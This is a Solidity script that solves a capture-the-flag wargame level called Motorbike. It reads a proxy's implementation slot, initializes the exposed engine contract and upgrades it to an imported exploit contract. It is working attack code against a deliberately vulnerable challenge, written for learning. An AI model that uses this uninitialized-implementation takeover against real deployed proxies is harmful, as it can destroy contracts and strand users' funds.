// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IMotorbike.sol";
import "../src/exploits/MotorbikeExploit.sol";

contract SolveLevel25 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xFe18db6501719Ab506683656AAf2F80243F8D0c0;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IMotorbike instance = IMotorbike(payable(instanceAddress));
        MotorbikeExploit exploit = new MotorbikeExploit();

        bytes32 implementationSlot = hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        bytes32 engineAddressBytes = vm.load(
            address(instance),
            implementationSlot
        );
        IMotorbike engine = IMotorbike(
            address(uint160(uint256(engineAddressBytes)))
        );
        engine.initialize();
        engine.upgradeToAndCall(
            address(exploit),
            abi.encodeWithSelector(exploit.exploit.selector)
        );
    }
}
